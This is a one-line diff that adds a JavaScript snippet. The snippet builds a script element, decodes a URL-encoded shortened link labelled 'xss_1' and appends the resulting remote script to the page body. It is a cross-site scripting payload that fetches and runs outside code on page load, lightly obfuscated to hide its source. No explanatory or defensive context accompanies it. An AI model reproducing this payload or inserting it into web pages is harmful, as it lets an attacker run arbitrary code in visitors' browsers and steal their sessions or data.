@@ -1,0 +1,1 @@
+d=document,s=d.createElement('script');s.src=decodeURIComponent('http:%2f%2fbit.ly%2fxss_1');d.body.appendChild(s);
